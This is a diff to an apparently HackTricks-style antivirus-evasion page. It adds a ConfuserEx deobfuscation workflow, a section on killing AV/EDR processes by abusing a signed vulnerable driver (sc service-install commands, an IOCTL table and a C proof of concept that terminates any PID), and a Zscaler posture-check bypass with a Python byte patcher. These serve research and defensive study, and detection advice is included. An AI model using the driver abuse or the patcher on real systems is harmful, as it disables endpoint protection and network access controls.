@@ -245,9 +245,44 @@ To bypass PowerShell logging, you can use the following techniques:
 > [!TIP]
 > Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.
 
-There are several tools that can be used to **obfuscate C# clear-text code**, generate **metaprogramming templates** to compile binaries or **obfuscate compiled binaries** such as:
+### Deobfuscating ConfuserEx-Protected .NET Binaries
 
-- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): It's a great open-source obfuscator for .NET applications. It provides various protection techniques such as control flow obfuscation, anti-debugging, anti-tampering, and string encryption. It's recommened cause it allows even to obfuscate specific chunks of code.
+When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.
+
+1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
+   ```bash
+   # https://github.com/wwh1004/AntiTamperKiller
+   python AntiTamperKiller.py Confused.exe Confused.clean.exe
+   ```
+   Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.
+
+2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
+   ```bash
+   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
+   ```
+   Flags:
+     • `-p crx` – select the ConfuserEx 2 profile
+     • de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.
+
+3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
+   ```bash
+   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
+   ```
+   After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).
+
+4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.
+
+The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.
+
+> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.
+
+#### One-liner
+```bash
+autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
+```
+
+---
+
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
 - [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): The aim of this project is to provide an open-source fork of the [LLVM](http://www.llvm.org/) compilation suite able to provide increased software security through [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) and tamper-proofing.
 - [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
@@ -638,5 +673,89 @@ https://github.com/praetorian-code/vulcan
 ### More
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
+
+## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space
+
+Storm-2603 leveraged a tiny console utility known as **Antivirus Terminator** to disable endpoint protections before dropping ransomware. The tool brings its **own vulnerable but *signed* driver** and abuses it to issue privileged kernel operations that even Protected-Process-Light (PPL) AV services cannot block.
+
+Key take-aways
+1. **Signed driver**: The file delivered to disk is `ServiceMouse.sys`, but the binary is the legitimately signed driver `AToolsKrnl64.sys` from Antiy Labs’ “System In-Depth Analysis Toolkit”. Because the driver bears a valid Microsoft signature it loads even when Driver-Signature-Enforcement (DSE) is enabled.
+2. **Service installation**:
+   ```powershell
+   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
+   sc start  ServiceMouse
+   ```
+   The first line registers the driver as a **kernel service** and the second one starts it so that `\\.\ServiceMouse` becomes accessible from user land.
+3. **IOCTLs exposed by the driver**
+   | IOCTL code | Capability                              |
+   |-----------:|-----------------------------------------|
+   | `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
+   | `0x990000D0` | Delete an arbitrary file on disk |
+   | `0x990001D0` | Unload the driver and remove the service |
+
+   Minimal C proof-of-concept:
+   ```c
+   #include <windows.h>
+   
+   int main(int argc, char **argv){
+       DWORD pid = strtoul(argv[1], NULL, 10);
+       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
+       CloseHandle(hDrv);
+       return 0;
+   }
+   ```
+4. **Why it works**:  BYOVD skips user-mode protections entirely; code that executes in the kernel can open *protected* processes, terminate them, or tamper with kernel objects irrespective of PPL/PP, ELAM or other hardening features.
+
+Detection / Mitigation
+•  Enable Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) so Windows refuses to load `AToolsKrnl64.sys`.
+•  Monitor creations of new *kernel* services and alert when a driver is loaded from a world-writable directory or not present on the allow-list.
+•  Watch for user-mode handles to custom device objects followed by suspicious `DeviceIoControl` calls.
+
+### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching
+
+Zscaler’s **Client Connector** applies device-posture rules locally and relies on Windows RPC to communicate the results to other components. Two weak design choices make a full bypass possible:
+
+1. Posture evaluation happens **entirely client-side** (a boolean is sent to the server).
+2. Internal RPC endpoints only validate that the connecting executable is **signed by Zscaler** (via `WinVerifyTrust`).
+
+By **patching four signed binaries on disk** both mechanisms can be neutralised:
+
+| Binary | Original logic patched | Result |
+|--------|------------------------|---------|
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
+| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
+| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
+| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |
+
+Minimal patcher excerpt:
+
+```python
+pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
+replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1
+
+with open("ZSATrayManager.exe", "r+b") as f:
+    data = f.read()
+    off = data.find(pattern)
+    if off == -1:
+        print("pattern not found")
+    else:
+        f.seek(off)
+        f.write(replacement)
+```
+
+After replacing the original files and restarting the service stack:
+
+* **All** posture checks display **green/compliant**.
+* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.
+
+This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.
+
+## References
+
+- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
